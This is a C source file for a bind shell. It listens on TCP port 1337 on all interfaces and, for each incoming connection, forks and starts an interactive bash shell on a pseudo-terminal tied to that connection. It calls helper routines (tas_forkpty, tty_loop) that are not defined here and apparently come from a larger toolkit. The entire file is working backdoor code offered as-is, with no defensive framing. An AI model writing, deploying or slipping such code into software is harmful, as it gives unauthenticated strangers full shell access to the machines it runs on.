#include <stdint.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#ifndef PORT
 #define PORT 1337
#endif

int start_listen(unsigned short port);
void myshell(int fd);

void bind_shell(void)
{
	int confd, fd;

	fd = start_listen(PORT);
	if (fd == -1) {
		return;
	}

	while (1) {
		confd = accept(fd, NULL, NULL);
		if (confd == -1) {
			continue;
		}

		pid_t pid = fork();
		if (pid != 0) {
			close(confd);
			continue;
		}

		myshell(confd);
	}

}

void myshell(int fd)
{
	tas_tty tty = TAS_TTY_INIT;
	pid_t pid = tas_forkpty(&tty);

	if (pid <= 0) {
		if (pid == -1) {
			goto end;
		}

		execve("/bin/bash", (char *[]){ "bash", "-i", NULL }, NULL);
		_exit(1);
	}

	tty.stdin_fd = fd;
	tty_loop(&tty);

end:
	close(fd);
}

int start_listen(unsigned short port)
{
	static struct sockaddr_in server_addr = {
		.sin_family = AF_INET,
		.sin_addr.s_addr = 0x00000000
	};

	static const int enable = 1;

	int sockfd;

	sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sockfd == -1) {
		return -1;
	}

	server_addr.sin_port = htons(port);

	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int)) < 0) {
		close(sockfd);
		return -1;
	}

#ifdef SO_REUSEPORT
	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &enable, sizeof(int)) < 0) {
		close(sockfd);
		return -1;
	}
#endif

	if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
		close(sockfd);
		return -1;
	}

	listen(sockfd, SOMAXCONN);

	return sockfd;
}
